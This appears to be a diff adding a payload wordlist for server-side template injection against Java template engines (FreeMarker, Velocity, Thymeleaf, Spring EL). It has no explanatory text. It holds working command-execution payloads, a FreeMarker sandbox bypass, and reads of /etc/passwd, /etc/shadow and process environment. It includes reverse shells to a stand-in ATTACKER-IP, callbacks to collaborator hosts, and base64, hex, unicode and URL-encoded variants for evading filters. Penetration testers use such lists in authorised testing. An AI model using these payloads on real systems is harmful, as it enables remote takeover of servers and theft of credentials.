@@ -1,0 +1,310 @@
+# ==================== BASIC DETECTION (TEST FIRST) ====================
+${7*7}
+${{7*7}}
+#{7*7}
+*{7*7}
+@{7*7}
+~{7*7}
+[[${7*7}]]
+[(7*7)]
+{{7*7}}
+{{7*7}}
+{{7*7}}
+<%= 7*7 %>
+${7*7}
+${{7*7}}
+#{7*7}
+*{7*7}
+@{7*7}
+~{7*7}
+
+# ==================== ENVIRONMENT VARIABLES ====================
+${T(java.lang.System).getenv()}
+${T(java.lang.System).getenv('PATH')}
+${T(java.lang.System).getProperty('user.dir')}
+${T(java.lang.System).getProperty('os.name')}
+${T(java.lang.System).getProperty('user.home')}
+${T(java.lang.System).getProperty('java.home')}
+${T(java.lang.System).getProperties()}
+${#systemProperties}
+${#environment}
+${#ctx}
+${#request}
+${#response}
+${#session}
+
+# ==================== BASIC RCE - JAVA RUNTIME ====================
+${T(java.lang.Runtime).getRuntime().exec('id')}
+${T(java.lang.Runtime).getRuntime().exec('whoami')}
+${T(java.lang.Runtime).getRuntime().exec('cat /etc/passwd')}
+${T(java.lang.Runtime).getRuntime().exec('curl http://YOUR-COLLABORATOR.com')}
+${T(java.lang.Runtime).getRuntime().exec('nslookup YOUR-COLLABORATOR.com')}
+${T(java.lang.Runtime).getRuntime().exec('sleep 5')}
+${T(java.lang.Runtime).getRuntime().exec('ping -c 5 YOUR-COLLABORATOR.com')}
+
+# ==================== ADVANCED RCE - WITH IOUTILS ====================
+${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('id').getInputStream())}
+${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('whoami').getInputStream())}
+${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('cat /etc/passwd').getInputStream())}
+${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('curl http://YOUR-COLLABORATOR.com').getInputStream())}
+${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('nslookup YOUR-COLLABORATOR.com').getInputStream())}
+
+# ==================== STRING CONCATENATION BYPASS (NO QUOTES) ====================
+${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(105).concat(T(java.lang.Character).toString(100))).getInputStream())}
+${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(119).concat(T(java.lang.Character).toString(104)).concat(T(java.lang.Character).toString(111)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(109)).concat(T(java.lang.Character).toString(105))).getInputStream())}
+${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())}
+
+# ==================== FREEMARKER DETECTION ====================
+${7*7}
+{{7*7}}
+#{7*7}
+${.vars}
+${.data_model}
+${.main}
+${.version}
+${.current_template_name}
+${.output_encoding}
+${.locale}
+${.time_zone}
+${.url_escaping_charset}
+${.template_language}
+${.template_name}
+${.node}
+${.node_name}
+${.node_type}
+${.node_namespace}
+
+# ==================== FREEMARKER RCE ====================
+${"freemarker.template.utility.Execute"?new()("id")}
+${"freemarker.template.utility.Execute"?new()("whoami")}
+${"freemarker.template.utility.Execute"?new()("cat /etc/passwd")}
+${"freemarker.template.utility.Execute"?new()("curl http://YOUR-COLLABORATOR.com")}
+${"freemarker.template.utility.Execute"?new()("nslookup YOUR-COLLABORATOR.com")}
+${"freemarker.template.utility.Execute"?new()("sleep 5")}
+<#assign ex = "freemarker.template.utility.Execute"?new()>${ex("id")}
+[#assign ex = 'freemarker.template.utility.Execute'?new()]${ex('id')}
+${"freemarker.template.utility.ObjectConstructor"?new()("java.lang.ProcessBuilder","id").start()}
+${"freemarker.template.utility.JythonRuntime"?new()("import os; os.system('id')")}
+
+# ==================== FREEMARKER SANDBOX BYPASS (Version < 2.3.30) ====================
+<#assign classloader=article.class.protectionDomain.classLoader>
+<#assign owc=classloader.loadClass("freemarker.template.ObjectWrapper")>
+<#assign dwf=owc.getField("DEFAULT_WRAPPER").get(null)>
+<#assign ec=classloader.loadClass("freemarker.template.utility.Execute")>
+${dwf.newInstance(ec,null)("id")}
+<#assign classloader=object.class.protectionDomain.classLoader>
+<#assign owc=classloader.loadClass("freemarker.template.ObjectWrapper")>
+<#assign dwf=owc.getField("DEFAULT_WRAPPER").get(null)>
+<#assign ec=classloader.loadClass("freemarker.template.utility.Execute")>
+${dwf.newInstance(ec,null)("cat /etc/passwd")}
+
+# ==================== FREEMARKER FILE READ ====================
+${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/etc/passwd').toURL().openStream().readAllBytes()?join(" ")}
+${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/home/carlos/my_password.txt').toURL().openStream().readAllBytes()?join(" ")}
+${configuration.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/etc/passwd').toURL().openStream().readAllBytes()?join(" ")}
+
+# ==================== VELOCITY DETECTION ====================
+#set($x=7*7)${x}
+#set($x=$x.class)
+#set($x=$x.forName("java.lang.Runtime"))
+#set($x=$x.getRuntime())
+#set($x=$x.exec("id"))
+${x}
+#set($str=$class.inspect("java.lang.String"))
+#set($ex=$str.valueOf($class.inspect("java.lang.Runtime").getRuntime().exec("id")))
+
+# ==================== VELOCITY RCE ====================
+#set($x=$class.inspect("java.lang.Runtime").getRuntime().exec("id"))
+#set($x=$class.inspect("java.lang.Runtime").getRuntime().exec("whoami"))
+#set($x=$class.inspect("java.lang.Runtime").getRuntime().exec("cat /etc/passwd"))
+#set($x=$class.inspect("java.lang.Runtime").getRuntime().exec("curl http://YOUR-COLLABORATOR.com"))
+#set($x=$class.inspect("java.lang.Runtime").getRuntime().exec("nslookup YOUR-COLLABORATOR.com"))
+#set($x=$class.inspect("java.lang.Runtime").getRuntime().exec("sleep 5"))
+#set($s="")
+#set($stringClass=$s.getClass())
+#set($runtime=$stringClass.forName("java.lang.Runtime").getRuntime())
+#set($process=$runtime.exec("id"))
+#set($out=$process.getInputStream())
+#set($null=$process.waitFor())
+#foreach($i in [1..$out.available()])
+$out.read()
+#end
+
+# ==================== THYMELEAF DETECTION ====================
+${7*7}
+[[${7*7}]]
+[(7*7)]
+__${7*7}__
+*{7*7}
+@{7*7}
+~{7*7}
+#{7*7}
+
+# ==================== THYMELEAF RCE ====================
+${T(java.lang.Runtime).getRuntime().exec('id')}
+${T(java.lang.Runtime).getRuntime().exec('whoami')}
+${T(java.lang.Runtime).getRuntime().exec('cat /etc/passwd')}
+${T(java.lang.Runtime).getRuntime().exec('curl http://YOUR-COLLABORATOR.com')}
+${T(java.lang.Runtime).getRuntime().exec('nslookup YOUR-COLLABORATOR.com')}
+${T(java.lang.Runtime).getRuntime().exec('sleep 5')}
+[[${T(java.lang.Runtime).getRuntime().exec('id')}]]
+[(T(java.lang.Runtime).getRuntime().exec('id'))]
+__${T(java.lang.Runtime).getRuntime().exec('id')}__
+#{T(java.lang.Runtime).getRuntime().exec('id')}
+*{T(java.lang.Runtime).getRuntime().exec('id')}
+@{T(java.lang.Runtime).getRuntime().exec('id')}
+~{T(java.lang.Runtime).getRuntime().exec('id')}
+
+# ==================== THYMELEAF SPRINGEL RCE ====================
+${T(java.lang.Runtime).getRuntime().exec('calc')}
+${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('id').getInputStream())}
+${#rt = @java.lang.Runtime@getRuntime(),#rt.exec("id")}
+${#rt = @java.lang.Runtime@getRuntime(),#rt.exec("curl http://YOUR-COLLABORATOR.com")}
+${new java.lang.ProcessBuilder("id").start()}
+${new java.lang.ProcessBuilder("cat","/etc/passwd").start()}
+
+# ==================== THYMELEAF OGNL RCE ====================
+${#rt = @java.lang.Runtime@getRuntime(),#rt.exec("id")}
+${#rt = @java.lang.Runtime@getRuntime(),#rt.exec("whoami")}
+${#rt = @java.lang.Runtime@getRuntime(),#rt.exec("cat /etc/passwd")}
+${#rt = @java.lang.Runtime@getRuntime(),#rt.exec("curl http://YOUR-COLLABORATOR.com")}
+${#rt = @java.lang.Runtime@getRuntime(),#rt.exec("nslookup YOUR-COLLABORATOR.com")}
+
+# ==================== EL (EXPRESSION LANGUAGE) DETECTION ====================
+${7*7}
+#{7*7}
+${7*7}
+#{7*7}
+*{7*7}
+@{7*7}
+~{7*7}
+
+# ==================== EL (EXPRESSION LANGUAGE) RCE ====================
+${T(java.lang.Runtime).getRuntime().exec('id')}
+${T(java.lang.Runtime).getRuntime().exec('whoami')}
+${T(java.lang.Runtime).getRuntime().exec('cat /etc/passwd')}
+${T(java.lang.Runtime).getRuntime().exec('curl http://YOUR-COLLABORATOR.com')}
+${T(java.lang.Runtime).getRuntime().exec('nslookup YOUR-COLLABORATOR.com')}
+${T(java.lang.Runtime).getRuntime().exec('sleep 5')}
+${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('id').getInputStream())}
+${pageContext.getServletContext().getResourceAsStream("/WEB-INF/web.xml").readAllBytes()}
+${facesContext.getExternalContext().getRequest().getParameter("cmd")}
+${applicationScope.get("javax.servlet.context.tempdir").getPath()}
+
+# ==================== SPRING FRAMEWORK RCE ====================
+*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('id').getInputStream())}
+*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('whoami').getInputStream())}
+*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('cat /etc/passwd').getInputStream())}
+*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('curl http://YOUR-COLLABORATOR.com').getInputStream())}
+*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('nslookup YOUR-COLLABORATOR.com').getInputStream())}
+#{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('id').getInputStream())}
+@{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('id').getInputStream())}
+~{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('id').getInputStream())}
+
+# ==================== SPRINGEL - SPRING BOOT RCE ====================
+${T(java.lang.Runtime).getRuntime().exec('id')}
+${T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec('id').getInputStream())}
+${new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec('id').getInputStream()))}
+${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('id').getInputStream())}
+
+# ==================== CLASS LOADER BYPASS ====================
+${''.getClass().forName('java.lang.Runtime').getRuntime().exec('id')}
+${''.getClass().forName('java.lang.Runtime').getRuntime().exec('whoami')}
+${''.getClass().forName('java.lang.Runtime').getRuntime().exec('cat /etc/passwd')}
+${''.getClass().forName('java.lang.Runtime').getRuntime().exec('curl http://YOUR-COLLABORATOR.com')}
+${''.getClass().forName('java.lang.Runtime').getRuntime().exec('nslookup YOUR-COLLABORATOR.com')}
+${''.getClass().forName('java.lang.Runtime').getRuntime().exec('sleep 5')}
+${''.getClass().forName('java.lang.ProcessBuilder').getConstructor(java.util.List.class).newInstance(['id']).start()}
+
+# ==================== CLASS.FORNAME BYPASS (NO QUOTES) ====================
+${''.getClass().forName(T(java.lang.Character).toString(106).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(118)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(46)).concat(T(java.lang.Character).toString(108)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(110)).concat(T(java.lang.Character).toString(103)).concat(T(java.lang.Character).toString(46)).concat(T(java.lang.Character).toString(82)).concat(T(java.lang.Character).toString(117)).concat(T(java.lang.Character).toString(110)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(105)).concat(T(java.lang.Character).toString(109)).concat(T(java.lang.Character).toString(101))).getRuntime().exec('id')}
+
+# ==================== BLIND SSTI WITH TIME DELAY ====================
+${T(java.lang.Thread).sleep(5000)}
+${T(java.lang.Thread).sleep(10000)}
+${T(java.lang.Thread).sleep(20000)}
+${T(java.lang.Thread).sleep(30000)}
+${T(java.lang.Thread).sleep(60000)}
+${T(java.lang.Runtime).getRuntime().exec('sleep 5')}
+${T(java.lang.ProcessBuilder).start(['sleep','5'])}
+${T(java.lang.System).getProperties().put('sun.rmi.transport.tcp.responseTimeout',5000)}
+
+# ==================== BLIND SSTI DNS CALLBACK ====================
+${T(java.lang.Runtime).getRuntime().exec('nslookup YOUR-COLLABORATOR.burpcollaborator.net')}
+${T(java.lang.Runtime).getRuntime().exec('ping -c 5 YOUR-COLLABORATOR.burpcollaborator.net')}
+${T(java.lang.Runtime).getRuntime().exec('curl http://YOUR-COLLABORATOR.burpcollaborator.net')}
+${T(java.lang.Runtime).getRuntime().exec('wget http://YOUR-COLLABORATOR.burpcollaborator.net')}
+${T(java.lang.ProcessBuilder).start(['nslookup','YOUR-COLLABORATOR.burpcollaborator.net'])}
+${T(java.lang.ProcessBuilder).start(['ping','-c','5','YOUR-COLLABORATOR.burpcollaborator.net'])}
+
+# ==================== FILE READ PAYLOADS ====================
+${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('cat /etc/passwd').getInputStream())}
+${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('cat /etc/hosts').getInputStream())}
+${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('cat /etc/shadow').getInputStream())}
+${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('cat /proc/self/environ').getInputStream())}
+${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('cat /home/*/.bashrc').getInputStream())}
+${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('ls -la').getInputStream())}
+${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('pwd').getInputStream())}
+
+# ==================== REVERSE SHELL PAYLOADS ====================
+${T(java.lang.Runtime).getRuntime().exec('bash -c "bash -i >& /dev/tcp/ATTACKER-IP/4444 0>&1"')}
+${T(java.lang.Runtime).getRuntime().exec('nc -e /bin/sh ATTACKER-IP 4444')}
+${T(java.lang.Runtime).getRuntime().exec('python -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\'ATTACKER-IP\',4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\'/bin/sh\',\'-i\'])"')}
+${T(java.lang.Runtime).getRuntime().exec('php -r "$sock=fsockopen(\"ATTACKER-IP\",4444);exec(\"/bin/sh -i <&3 >&3 2>&3\");"')}
+${T(java.lang.Runtime).getRuntime().exec('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER-IP 4444 >/tmp/f')}
+
+# ==================== WAF BYPASS - CHARACTER CONCATENATION ====================
+${T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(105).concat(T(java.lang.Character).toString(100)))}
+${T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(119).concat(T(java.lang.Character).toString(104)).concat(T(java.lang.Character).toString(111)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(109)).concat(T(java.lang.Character).toString(105)))}
+${T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100)))}
+
+# ==================== WAF BYPASS - HEX ENCODING ====================
+${T(java.lang.Runtime).getRuntime().exec(new java.lang.String(new byte[]{0x69,0x64}))}
+${T(java.lang.Runtime).getRuntime().exec(new java.lang.String(new byte[]{0x77,0x68,0x6f,0x61,0x6d,0x69}))}
+${T(java.lang.Runtime).getRuntime().exec(new java.lang.String(new byte[]{0x63,0x61,0x74,0x20,0x2f,0x65,0x74,0x63,0x2f,0x70,0x61,0x73,0x73,0x77,0x64}))}
+
+# ==================== WAF BYPASS - BASE64 ENCODING ====================
+${T(java.lang.Runtime).getRuntime().exec(new java.lang.String(java.util.Base64.getDecoder().decode("aWQ=")))}
+${T(java.lang.Runtime).getRuntime().exec(new java.lang.String(java.util.Base64.getDecoder().decode("d2hvYW1p")))}
+${T(java.lang.Runtime).getRuntime().exec(new java.lang.String(java.util.Base64.getDecoder().decode("Y2F0IC9ldGMvcGFzc3dk")))}
+
+# ==================== WAF BYPASS - URL ENCODING ====================
+%24%7BT(java.lang.Runtime).getRuntime().exec('id')%7D
+%24%7BT(java.lang.Runtime).getRuntime().exec('whoami')%7D
+%24%7BT(java.lang.Runtime).getRuntime().exec('cat%20/etc/passwd')%7D
+%24%7BT(java.lang.Runtime).getRuntime().exec('nslookup%20YOUR-COLLABORATOR.com')%7D
+
+# ==================== WAF BYPASS - DOUBLE URL ENCODING ====================
+%2524%257BT(java.lang.Runtime).getRuntime().exec('id')%257D
+%2524%257BT(java.lang.Runtime).getRuntime().exec('whoami')%257D
+%2524%257BT(java.lang.Runtime).getRuntime().exec('cat%2520/etc/passwd')%257D
+
+# ==================== WAF BYPASS - UNICODE ENCODING ====================
+${T(java.lang.Runtime).getRuntime().exec('\u0069\u0064')}
+${T(java.lang.Runtime).getRuntime().exec('\u0077\u0068\u006f\u0061\u006d\u0069')}
+${T(java.lang.Runtime).getRuntime().exec('\u0063\u0061\u0074\u0020\u002f\u0065\u0074\u0063\u002f\u0070\u0061\u0073\u0073\u0077\u0064')}
+
+# ==================== MULTI-STAGE RCE ====================
+${T(java.lang.Runtime).getRuntime().exec('id && nslookup YOUR-COLLABORATOR.com')}
+${T(java.lang.Runtime).getRuntime().exec('id; nslookup YOUR-COLLABORATOR.com')}
+${T(java.lang.Runtime).getRuntime().exec('id | nslookup YOUR-COLLABORATOR.com')}
+${T(java.lang.Runtime).getRuntime().exec('id || nslookup YOUR-COLLABORATOR.com')}
+${T(java.lang.Runtime).getRuntime().exec('sleep 5 && nslookup YOUR-COLLABORATOR.com')}
+
+# ==================== STREAM READING RCE (GET OUTPUT) ====================
+${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('id').getInputStream())}
+${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('whoami').getInputStream())}
+${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('cat /etc/passwd').getInputStream())}
+${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec('id').getInputStream()).useDelimiter('\\A').next()}
+${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec('whoami').getInputStream()).useDelimiter('\\A').next()}
+${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec('cat /etc/passwd').getInputStream()).useDelimiter('\\A').next()}
+
+# ==================== 2026 LATEST RCE PAYLOADS ====================
+${T(java.lang.ProcessBuilder).start(['bash','-c','curl http://YOUR-COLLABORATOR.com'])}
+${T(java.lang.ProcessBuilder).start(['bash','-c','nslookup YOUR-COLLABORATOR.com'])}
+${T(java.lang.ProcessBuilder).start(['bash','-c','sleep 5'])}
+${T(java.lang.ProcessBuilder).start(['bash','-c','id']).getInputStream().readAllBytes()}
+${T(java.lang.ProcessBuilder).start(['bash','-c','cat /etc/passwd']).getInputStream().readAllBytes()}
+${#request.getParameter('cmd')}
+${#session.getAttribute('cmd')}
+${#application.getAttribute('cmd')}
